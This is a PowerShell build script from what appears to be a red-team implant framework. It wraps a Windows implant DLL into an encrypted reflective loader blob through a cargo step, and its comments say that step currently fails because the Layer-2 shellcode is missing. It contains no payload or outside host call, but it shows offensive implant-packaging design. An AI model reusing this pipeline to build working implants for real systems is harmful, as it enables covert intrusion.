# wrap_blob.ps1 — wrap the prod implant DLL into the reflective PIC blob.
#
# DEPENDENCY ON crates/nyx-loader (loader owner):
#   This script invokes `cargo run -p nyx-loader --example wrap -- <input> <output>`
#   (crates/nyx-loader/examples/wrap.rs), which reads <input_dll>, calls
#   nyx_loader::wrap_payload() with a random LoaderConfig, and writes the blob
#   to <output_blob>.
#
#   STATUS: wrap_payload() currently ALWAYS fails — generate_loader_stub()
#   returns LoaderError::Layer2Unavailable because the on-target Layer-2
#   shellcode does not exist. This step therefore fails loudly (no blob is
#   produced), which is correct fail-closed behavior: the loader capability is
#   not shippable until a real Layer-2 exists (spec §5.3). When Layer-2 lands,
#   this step starts producing the blob again and loader_probe_gate.ps1 takes
#   over verification.
#
# Input:  crates/implant-win/target/x86_64-pc-windows-msvc/release/nyx_implant_win.dll
#         (produced by build_prod_dll.ps1)
# Output: crates/nyx-loader/target/release/nyx_loader_blob.bin
#         (stage_assets.ps1 copies this into staging/)
#
# The wrap step is release-blocking per spec §4 (loader probe gate consumes
# this blob). We do NOT verify the blob injects cleanly here — that is
# loader_probe_gate.ps1's job.
#
# Assumes CWD = repo root. PowerShell 5.1.
$ErrorActionPreference = 'Stop'

# ---- T1 integration knobs (update here if T1 names the target differently) ----
# WRAP_MODE = 'example' → cargo run -p nyx-loader --example wrap
# WRAP_MODE = 'bin'     → cargo run -p nyx-loader -- wrap
$WRAP_PKG    = 'nyx-loader'
$WRAP_TARGET = 'wrap'
$WRAP_MODE   = 'example'

# ---- Inputs / outputs ----
$inputDll  = 'crates\implant-win\target\x86_64-pc-windows-msvc\release\nyx_implant_win.dll'
$outputDir = 'crates\nyx-loader\target\release'
$outputBlob = Join-Path $outputDir 'nyx_loader_blob.bin'

if (-not (Test-Path $inputDll)) {
    Write-Host "::error::prod DLL not found at $inputDll — run build_prod_dll.ps1 first."
    exit 1
}
if (-not (Test-Path $outputDir)) { New-Item -ItemType Directory -Path $outputDir -Force | Out-Null }

Write-Host '== wrap_blob: invoke nyx-loader wrap target =='
# Build + run in one shot. --release so the chacha20poly1305 + PE parse path is
# the optimized build the operator will see on a real engagement.
$cargoArgs = @('run', '-p', $WRAP_PKG, '--release')
if ($WRAP_MODE -eq 'example') {
    $cargoArgs += @('--example', $WRAP_TARGET)
} elseif ($WRAP_MODE -eq 'bin') {
    # bin mode: no --example flag; the target name is the first positional after --.
    $cargoArgs += @('--', $WRAP_TARGET)
} else {
    Write-Host "::error::unknown WRAP_MODE='$WRAP_MODE' (expected 'example' or 'bin')"
    exit 1
}
$cargoArgs += @('--', $inputDll, $outputBlob)

Write-Host ("invoking: cargo " + ($cargoArgs -join ' '))
# PS 5.1 NATIVE-COMMAND STDERR TRAP — see build_prod_dll.ps1.
$prevEAP = $ErrorActionPreference
$ErrorActionPreference = 'Continue'
try {
    & cargo @cargoArgs 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Host "::error::nyx-loader wrap failed (exit $LASTEXITCODE)."
        Write-Host '::error::Expected while Layer-2 is unimplemented: generate_loader_stub() fails loudly'
        Write-Host '::error::with LoaderError::Layer2Unavailable, so no reflective blob can be produced.'
        Write-Host '::error::This is release-blocking by design (see header of this script).'
        exit 1
    }
}
finally {
    $ErrorActionPreference = $prevEAP
}

if (-not (Test-Path $outputBlob)) {
    Write-Host "::error::wrap target ran but produced no output blob at $outputBlob"
    exit 1
}
$size = (Get-Item $outputBlob).Length
# Sanity: blob must be larger than the DLL (PIC stub + NYX2 header + nonce + tag
# = ~86 bytes overhead, ciphertext = plaintext len). A blob smaller than the
# input is a wrap_payload() bug.
$dllSize = (Get-Item $inputDll).Length
if ($size -lt $dllSize) {
    Write-Host "::error::blob ($size bytes) is smaller than input DLL ($dllSize bytes) — wrap_payload layout is wrong."
    exit 1
}
Write-Host ("== wrap_blob OK: {0} ({1} bytes; DLL was {2} bytes) ==" -f $outputBlob, $size, $dllSize)
